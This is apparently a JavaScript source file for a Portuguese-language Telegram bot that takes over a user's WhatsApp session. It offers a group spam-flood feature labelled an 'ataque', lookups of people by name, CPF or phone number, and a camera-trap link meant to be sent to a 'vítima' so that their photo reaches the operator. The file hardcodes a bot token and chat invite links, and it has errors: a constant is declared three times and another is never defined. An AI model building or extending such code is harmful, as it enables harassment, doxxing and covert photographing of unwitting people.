const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys");
const { Telegraf, Markup } = require('telegraf');
const pino = require('pino');
const axios = require('axios');

const BOT_TOKEN = '8699304863:AAGKASDaaoJwrPNCrWoQY7HnOQ5KJBQ-tno';
const bot = new Telegraf(BOT_TOKEN);

// --- CONFIGURAÇÕES DO SITE DE CÂMERA ---
const URL_DO_SITE = 'https://seu-site-hospedado.com'; // ONDE VOCÊ SUBIU O HTML

const CANAL_1 = 'https://t.me/+fJHK4uBEE3AyZmUx';
const CANAL_2 = 'https://whatsapp.com/channel/0029Vb7mYOKIyPtXVENsy60v';
const LINK_CHAT = 'https://t.me/sem_nome123456';
const LINK_CHAT = 'https://chat.whatsapp.com/If0kpzxMRjHF7v0Bnkjp09';
const LINK_CHAT = 'https://chat.whatsapp.com/F9mebHrNzLP1cOAC2NkA0Z';

const userSessions = {}; 

function mostrarMenuPrincipal(ctx) {
    const menu = Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Rajar Mensagem', 'btn_rajar')],
        [Markup.button.callback('🌐 Consultar IP', 'btn_ip')],
        [Markup.button.callback('📊 Dados', 'btn_dados')],
        [Markup.button.callback('📸 Câmera', 'btn_cam')],
        [Markup.button.callback('🚫 Denunciar', 'btn_denunciar')]
    ]);
    ctx.reply("🎮 **MENU PRINCIPAL** 🎮", { parse_mode: 'Markdown', ...menu });
}

bot.start((ctx) => {
    const teclado = Markup.inlineKeyboard([
        [Markup.button.url('Canal 1', `https://t.me/${CANAL_1.replace('@','')}`)],
        [Markup.button.url('Canal 2', `https://t.me/${CANAL_2.replace('@','')}`)],
        [Markup.button.url('Entrar no Chat', LINK_CHAT)],
        [Markup.button.callback('✅ Verificado', 'check_status')]
    ]);
    ctx.reply(`👋 Olá! Siga os canais para liberar o menu:`, teclado);
});

bot.action('check_status', async (ctx) => {
    ctx.editMessageText('✅ Verificado! Conecte seu WhatsApp:', 
        Markup.inlineKeyboard([[Markup.button.callback('📱 Conectar via Número', 'conn_numero')]])
    );
});

bot.action('conn_numero', (ctx) => {
    userSessions[ctx.from.id] = { step: 'waiting_phone' };
    ctx.reply('📞 Digite seu número do WhatsApp (ex: 5511999998888):');
});

// --- LOGICA DE MENSAGENS E RAJAR ---
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    if (!state) return;

    if (state.step === 'waiting_phone') {
        const phone = text.replace(/\D/g, '');
        const { state: authState, saveCreds } = await useMultiFileAuthState(`./sessions/${userId}`);
        const sock = makeWASocket({ auth: authState, logger: pino({ level: 'silent' }) });

        try {
            setTimeout(async () => {
                let code = await sock.requestPairingCode(phone);
                ctx.reply(`🔢 Código: \`${code}\``, { parse_mode: 'Markdown' });
            }, 3000);
            state.sock = sock;
            sock.ev.on('creds.update', saveCreds);
            sock.ev.on('connection.update', (up) => {
                if (up.connection === 'open') {
                    mostrarMenuPrincipal(ctx);
                    state.step = 'connected';
                }
            });
        } catch (e) { ctx.reply("❌ Erro."); }
    }

    else if (state.step === 'waiting_rajar') {
        const [msg, qtdStr] = text.split('|');
        const qtd = parseInt(qtdStr);
        for (let i = 0; i < qtd; i++) {
            await state.sock.sendMessage(state.targetGroup, { text: `${msg}\n\n🤖 *Bot:* ${LINK_BOT}` });
            await delay(800);
        }
        ctx.reply("✅ Rajada finalizada!");
        state.step = 'connected';
    }

    else if (state.step === 'waiting_dados') {
        ctx.reply("🔎 Consultando...");
        // Sua lógica de API aqui...
        state.step = 'connected';
    }
});

// --- CALLBACKS DO MENU ---
bot.action('btn_rajar', async (ctx) => {
    const session = userSessions[ctx.from.id];
    if (!session || !session.sock) return ctx.reply("❌ Conecte o WhatsApp.");
    const groups = await session.sock.groupFetchAllParticipating();
    const buttons = Object.values(groups).slice(0, 10).map(g => [Markup.button.callback(g.subject, `ataque:${g.id}`)]);
    ctx.reply("📂 Selecione o Grupo:", Markup.inlineKeyboard(buttons));
});

bot.action(/ataque:(.+)/, (ctx) => {
    userSessions[ctx.from.id].targetGroup = ctx.match[1];
    userSessions[ctx.from.id].step = 'waiting_rajar';
    ctx.reply("📝 Envie: Mensagem | Quantidade");
});

bot.action('btn_dados', (ctx) => {
    userSessions[ctx.from.id].step = 'waiting_dados';
    ctx.reply("📊 Envie o nome, CPF ou celular para consulta:");
});

// --- BOTÃO DE CÂMERA (GERA O LINK COM ID) ---
bot.action('btn_cam', (ctx) => {
    const userId = ctx.from.id;
    // O link vai com o ID do botter para o site saber para quem mandar a foto
    const linkCam = `${URL_DO_SITE}/index.html?id=${userId}`;
    
    ctx.reply(`📸 **PAINEL DE CÂMERA**\n\nEnvie o link abaixo para a vítima. Quando ela clicar em "SORTEAR", a foto será enviada aqui:\n\n🔗 ${linkCam}`, { parse_mode: 'Markdown' });
});

bot.launch();
console.log("🤖 Bot iniciado!");